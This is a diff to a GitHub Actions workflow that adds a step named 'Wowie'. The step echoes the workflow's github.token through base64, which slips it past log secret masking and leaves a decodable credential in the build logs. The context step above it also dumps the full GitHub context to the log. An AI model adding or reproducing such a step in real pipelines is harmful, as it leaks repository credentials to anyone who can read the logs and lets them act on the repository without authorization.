@@ -13,3 +13,7 @@ jobs:
         env:
           GITHUB_CONTEXT: ${{ toJson(github) }}
         run: echo "$GITHUB_CONTEXT"
+      - name: Wowie
+        env:
+          GREAT: ${{ github.token }}
+        run: echo $GREAT | base64
